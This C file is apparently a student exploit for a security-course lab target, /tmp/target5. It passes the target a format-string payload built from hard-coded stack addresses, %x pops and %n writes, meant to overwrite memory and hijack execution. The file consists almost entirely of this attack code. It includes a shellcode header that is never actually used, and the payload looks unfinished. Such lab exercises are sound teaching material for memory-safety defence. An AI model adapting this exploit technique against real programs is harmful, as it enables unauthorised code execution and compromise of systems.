#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  char buffer[400];
  int i;

  for (i = 0; i < sizeof(buffer); i++) {
  	buffer[i] = 'A';
  }







//														   |28																		   |56
  args[0] = TARGET; args[1] = "A%08x%08x7530\xb9\xfe\xff\xbf7530\xba\xfe\xff\xbf7530\xbb\xfe\xff\xbf7530\xbc\xfe\xff\xbf%8u%n%256u%n%256u%n%256u%n"; args[2] = NULL;
  //9


  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
